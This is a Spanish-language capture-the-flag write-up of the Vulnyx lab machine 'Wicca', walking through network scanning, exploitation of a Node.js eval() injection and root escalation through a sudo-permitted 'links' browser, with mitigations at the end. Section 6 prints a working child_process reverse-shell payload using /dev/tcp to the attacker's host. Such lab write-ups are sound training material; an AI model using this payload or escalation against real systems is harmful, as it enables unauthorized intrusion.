# Wicca | Vulnyx | Writeup

> Writeup de la máquina **Wicca** de la plataforma **Vulnyx**, resuelta en un entorno de laboratorio **autorizado y controlado**. El objetivo es documentar el proceso completo de reconocimiento, explotación y escalada de privilegios con fines **estrictamente educativos**. Todas las pruebas se realizaron contra una máquina propia en una red aislada.

## Información del laboratorio

| Información | Detalle |
| ----------- | ------- |
| **Laboratorio** | Wicca (Vulnyx) |
| **Objetivo** | Obtener las flags `user.txt` y `root.txt` |
| **Máquina atacante** | Kali Linux — `192.168.0.13` |
| **Máquina víctima** | Wicca — `192.168.0.17` |
| **Entorno** | VirtualBox, red local aislada `192.168.0.0/24` |
| **Acceso inicial** | Inyección de código en `eval()` (Node.js) en el puerto 5000 |
| **Usuario comprometido** | `aleister` |
| **Vulnerabilidades explotadas** | RCE vía `eval()` server-side · Sudo misconfig (`/usr/bin/links` NOPASSWD) |
| **Resultado** | Compromiso total del sistema (root) |

## Índice

1. [Reconocimiento de red](#1-reconocimiento-de-red)
2. [Escaneo del objetivo](#2-escaneo-del-objetivo)
3. [Enumeración del servicio web (puerto 80)](#3-enumeración-del-servicio-web-puerto-80)
4. [Enumeración de la aplicación (puerto 5000)](#4-enumeración-de-la-aplicación-puerto-5000)
5. [Identificación de la vulnerabilidad](#5-identificación-de-la-vulnerabilidad)
6. [Explotación — Reverse Shell](#6-explotación--reverse-shell)
7. [Flag de usuario](#7-flag-de-usuario)
8. [Escalada de privilegios](#8-escalada-de-privilegios)
9. [Flag de root](#9-flag-de-root)
10. [Cadena de ataque](#10-cadena-de-ataque)
11. [Conclusión](#11-conclusión)

---

## 1. Reconocimiento de red

Antes de atacar el objetivo, identifico mi propia configuración de red para conocer el segmento y la puerta de enlace.

```bash
ip -br addr
```

<img width="967" height="74" alt="image" src="https://github.com/user-attachments/assets/1bdec28b-93ab-4353-8bb5-285e73727ea1" />

*Interfaz `eth0` con IP `192.168.0.13/24` — segmento `192.168.0.0/24`.*

```bash
ip route
```

<img width="615" height="56" alt="image" src="https://github.com/user-attachments/assets/4f199939-6a3f-4fd9-a13e-df4043f1b319" />

*Puerta de enlace predeterminada: `192.168.0.1`.*

Con el segmento identificado, realizo un **host discovery** con ARP (`-PR`) para listar los equipos activos sin tocar puertos todavía.

```bash
sudo nmap -sn -PR 192.168.0.0/24 -oA host-discovery-inicial
```

<img width="546" height="423" alt="image" src="https://github.com/user-attachments/assets/f26891d7-9862-4379-be2f-b6e400a6ba13" />

*8 hosts activos. El objetivo `192.168.0.17` se identifica por su MAC de VirtualBox (`08:00:27:...`).*

Extraigo únicamente las IPs activas del `.gnmap` para trabajar más cómodo.

```bash
awk '/Status: Up/ {print $2}' host-discovery-inicial.gnmap
```

<img width="517" height="150" alt="image" src="https://github.com/user-attachments/assets/f74e2e84-42dc-4bdb-8235-0f9320a76e07" />

*Listado limpio de hosts activos, incluyendo el objetivo `192.168.0.17`.*

**Hallazgo:** El objetivo es una VM de VirtualBox en `192.168.0.17`.

---

## 2. Escaneo del objetivo

Ejecuto detección de sistema operativo sobre el objetivo.

```bash
sudo nmap -O 192.168.0.17 -oA os-fingerprint-192.168.0.17
```

<img width="961" height="325" alt="Detección de sistema operativo" src="https://github.com/user-attachments/assets/17f0dce2-bf89-495c-a06c-84e8f50196e1" />

*Puertos abiertos: `22/ssh`, `80/http`, `5000/upnp`. SO: Linux (familia Debian/4.x–5.x).*

A continuación realizo detección de versiones sobre los puertos de interés.

```bash
sudo nmap -sV -p 22,80,500 192.168.0.17 -oA service-detection-inicial-192.168.0.17
```

<img width="777" height="232" alt="Detección de servicios" src="https://github.com/user-attachments/assets/88e23221-8565-45a6-a655-b9f175e37b31" />

*`22` → OpenSSH 9.2p1 Debian · `80` → Apache httpd 2.4.57 (Debian) · `500` cerrado. El servicio relevante vive en el `5000`.*

Enumero los métodos de autenticación admitidos por SSH.

```bash
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.0.17
```

<img width="777" height="232" alt="Detección de servicios" src="https://github.com/user-attachments/assets/cf11c8f7-19c5-4092-8c25-4226519ca0ee" />

*Métodos soportados: `publickey` y `password`.*

```bash
nmap -p 22 --script ssh2-enum-algos 192.168.0.17
```

<img width="537" height="753" alt="Enumeración de algoritmos ssh" src="https://github.com/user-attachments/assets/58ad43f9-827b-4973-9f34-120b6abd95db" />

*Enumeración de algoritmos de intercambio de claves, cifrado y MAC del servicio SSH.*

**Hallazgo:** Tres servicios expuestos. El vector más prometedor es la aplicación web del puerto `5000`.

---

## 3. Enumeración del servicio web (puerto 80)

Inspecciono las cabeceras HTTP del servidor Apache.

```bash
curl -I http://192.168.0.17 | tee http-headers-inicial-192.168.0.17.txt
```

<img width="642" height="214" alt="Inspección de información de las cabeceras http" src="https://github.com/user-attachments/assets/2fa2dc28-4605-497d-b5d3-3bd6209500ad" />

*`HTTP/1.1 200 OK` — Apache/2.4.57 (Debian), `Content-Type: text/html`.*

Verifico la existencia de `robots.txt`.

```bash
curl -i http://192.168.0.17/robots.txt | tee http-robots-inicial-192.168.0.17.txt
```

<img width="642" height="214" alt="Inspección de información de las cabeceras http" src="https://github.com/user-attachments/assets/d3791719-a7fb-407f-8bd5-c36c16833eef" />

*`404 Not Found` — no existe `robots.txt`.*

Realizo fuzzing de directorios con Gobuster.

```bash
gobuster dir -u http://192.168.0.17 -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-common-192.168.0.17.txt
```

<img width="979" height="435" alt="Enumeración de direectorios http con Gobuster con diccionario chico" src="https://github.com/user-attachments/assets/e5c3ab06-74cd-415a-8997-fa299103e58f" />

*Se descubren `/images` (301), `/javascript` (301, luego 403) e `index.html`.*

Inspecciono los directorios encontrados en el navegador.

<img width="582" height="226" alt="Inspección en navegador javascript http" src="https://github.com/user-attachments/assets/e981f6b9-5a4e-4993-a303-2d8783e43731" />

*`Index of /images` — solo contiene `logo.png`.*

<img width="582" height="226" alt="Inspección en navegador javascript http" src="https://github.com/user-attachments/assets/ddf418d7-d15a-4e52-911a-52e5565e8c17" />

*`/javascript` devuelve `Forbidden` (403).*

**Hallazgo:** El sitio del puerto 80 es estático y sin contenido explotable. El foco pasa al puerto `5000`.

---

## 4. Enumeración de la aplicación (puerto 5000)

Accedo a la aplicación del puerto 5000, una web Node.js/Express con un formulario "What is your name?".

![Inspección en navegador puerto 5000](images/14-app-5000.png)

*Aplicación VULNYX con un campo de entrada de nombre.*

Al enviar un nombre, la URL incorpora dos parámetros (`name` y `token`) y la página responde con un saludo.

![Ingreso test en puerto 5000](images/15-name-test.png)

*`?name=test&token=...` → la web responde `Welcome test!`. El parámetro `name` se refleja en la respuesta.*

**Hallazgo:** La aplicación usa dos parámetros GET: `name` (reflejado en el saludo) y `token`.

---

## 5. Identificación de la vulnerabilidad

Pruebo cómo se comporta cada parámetro. Primero modifico `name`.

![Cambio valor de name en URL y cambia solo el usuario](images/16-name-change.png)

*Cambiar `name=test1` solo altera el usuario mostrado: `Welcome test1!`. Es una reflexión literal del valor.*

Al cambiar `token` por un número, no se produce ningún cambio visible.

![Cambio valor de token en URL y no cambia nada](images/17-token-no-change.png)

*`token=1` → `eval(1)` devuelve `1` pero no se muestra. Sin cambios en la página.*

El comportamiento cambia radicalmente al enviar una **cadena** en `token`.

<img width="364" height="34" alt="Cambio valor de token a test y la web genera un error 1" src="https://github.com/user-attachments/assets/5422b653-d45b-4209-809c-ea12725f6d27" />

*URL con `?name=test&token=test`.*

<img width="868" height="276" alt="Cambio valor de token a test y la web genera un error 2" src="https://github.com/user-attachments/assets/7fb4f859-db46-4a3a-be5b-47dbac5f83e0" />

*`ReferenceError: test is not defined at eval (eval at <anonymous> (/home/aleister/website/main.js:10:15))`.*

El stack trace es concluyente: el parámetro `token` se pasa directamente a **`eval()`** en el servidor. Al enviar `test` (una variable inexistente), Node.js lanza `ReferenceError`. Para distinguir reflexión de ejecución, confirmo que `name` **no** se evalúa.

<img width="793" height="473" alt="Se confirma ejecució nde Javascript del lado del servidor" src="https://github.com/user-attachments/assets/6a025b25-b78f-4bb0-8459-d970f448b17a" />

*`name=1+1` se muestra literal como `1+1` (reflexión), mientras que `token` es interpretado por `eval()`. El sink de ejecución es `token`.*

**Hallazgo:** Inyección de código del lado del servidor (**RCE**) a través del parámetro `token`, procesado por `eval()` en `main.js:10`.

---

## 6. Explotación — Reverse Shell

Construyo un payload de reverse shell en Node.js usando `child_process`, apuntando a mi Kali (`192.168.0.13:4444`).

```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/192.168.0.13/4444 0>&1"')
```

Como el payload viaja en un parámetro GET, lo codifico en **URL-encoded**.

<img width="793" height="473" alt="Se confirma ejecució nde Javascript del lado del servidor" src="https://github.com/user-attachments/assets/ab769a73-6870-4579-a719-c6c9bd1d1eef" />

*Codificación del payload `child_process` a formato URL-encoded para inyectarlo en `token`.*

Dejo un listener a la escucha en Kali:

```bash
nc -lvnp 4444
```

E inyecto el payload codificado en el parámetro `token` desde el navegador:

```
http://192.168.0.17:5000/?name=test&token=<payload-urlencoded>
```

<img width="476" height="214" alt="nc en escucha y se recibe la shell" src="https://github.com/user-attachments/assets/c53a0c11-0951-43c2-8e85-704c3b7a7588" />

*Conexión entrante desde `192.168.0.17`. Shell obtenida como `aleister@wicca`.*

**Resultado:** Acceso inicial al sistema como el usuario **`aleister`**.

---

## 7. Flag de usuario

Ya dentro del sistema, enumero el home del usuario comprometido.

```bash
whoami
cd /home/aleister
ls
cat user.txt
```

<img width="476" height="214" alt="nc en escucha y se recibe la shell" src="https://github.com/user-attachments/assets/5bb21205-2724-4d91-b9c7-d358209ebd0f" />

*Home de `aleister` con `user.txt` y la carpeta `website` (código fuente de la app vulnerable).*

**Flag de usuario:**

```
VulNyx{d9f213df08ea2b3bf6cc90be28fa827f}
```

---

## 8. Escalada de privilegios

Confirmo que con permisos bajos no puedo acceder al directorio de root.

```bash
cd /root
```

<img width="282" height="78" alt="No se puede ingresar a root con permisos bajos" src="https://github.com/user-attachments/assets/c6a3a3f1-1ed7-4721-8251-e10ef3f661ae" />

*`cd: root: Permission denied`.*

Enumero los permisos `sudo` del usuario.

```bash
sudo -l
```

<img width="479" height="180" alt="Enumero permisos sudo" src="https://github.com/user-attachments/assets/b464906b-01dc-431a-8a20-346ab46c667e" />

*`aleister` puede ejecutar `(root) NOPASSWD: /usr/bin/links`.*

El binario `links` (navegador en modo texto) figura en [GTFOBins](https://gtfobins.github.io/gtfobins/links/) como vector de escalada: su menú incluye una opción **`OS shell`** que, al ejecutarse con `sudo`, hereda privilegios de root.

```bash
sudo /usr/bin/links
```

Dentro de `links`, se navega con el **teclado** (el mouse genera secuencias de escape ruidosas). Presionando `Enter` se abre el menú superior; en **File → OS shell** se solicita un shell del sistema.

<img width="469" height="385" alt="Luego de probar teclas se encuentra que con Enter se abre un menú donde se puede solicitar una shell como root" src="https://github.com/user-attachments/assets/ddba5a51-a0b0-4f86-b913-67061ff9f43f" />

*Menú `File` de `links` con la opción `OS shell` resaltada.*

**Hallazgo:** Sudo mal configurado — `links` con `NOPASSWD` permite abrir un shell como root vía su opción `OS shell`.

---

## 9. Flag de root

Al seleccionar **OS shell** y presionar `Enter`, se abre un shell con privilegios de **root**.

```bash
whoami
cd /root
cat root.txt
```

<img width="371" height="200" alt="image" src="https://github.com/user-attachments/assets/9f6dfdc1-9a32-4f18-8151-cf3cd6df3755" />

*`whoami` → `root`. Acceso total al sistema y lectura de `root.txt`.*

**Flag de root:**

```
VulNyx{dab686b0ee76b5xxxxxxxxxxxxx}
```

**Resultado:** Compromiso total de la máquina Wicca.

---

## 10. Cadena de ataque

```
Reconocimiento de red (192.168.0.0/24)
        │
        ▼
Objetivo 192.168.0.17 → puertos 22 / 80 / 5000
        │
        ▼
App Node.js (puerto 5000) → parámetro `token` en eval()
        │
        ▼
RCE vía payload child_process (URL-encoded) → Reverse Shell
        │
        ▼
Usuario aleister → user.txt
        │
        ▼
sudo -l → /usr/bin/links (NOPASSWD)
        │
        ▼
GTFOBins: links → OS shell → ROOT → root.txt
```

---

## 11. Conclusión

La máquina **Wicca** encadena dos fallos clásicos y evitables:

1. **Inyección de código en `eval()`**: la aplicación pasa entrada del usuario (`token`) directamente a `eval()` sin validación ni sanitización, permitiendo ejecución arbitraria de código del lado del servidor. La mitigación es simple: **nunca** pasar entrada no confiable a `eval()`; usar parsers seguros (`JSON.parse`, validación estricta de tipos) y aplicar el principio de mínima exposición.

2. **Configuración sudo insegura**: otorgar `NOPASSWD` sobre binarios interactivos como `links` permite escapar a un shell con privilegios elevados (GTFOBins). La mitigación es restringir `sudo` a comandos no interactivos y revisar periódicamente las entradas en `/etc/sudoers`.

El ejercicio refuerza la importancia de **validar cada paso con evidencia** y de entender *por qué* funciona cada técnica, no solo *cómo* ejecutarla.

---

> ⚠️ **Disclaimer:** Todo el contenido de este writeup se realizó sobre una máquina de laboratorio **propia**, en un entorno **aislado y autorizado**, con fines **educativos y de investigación en seguridad ofensiva**. No debe aplicarse sobre sistemas sin autorización explícita.
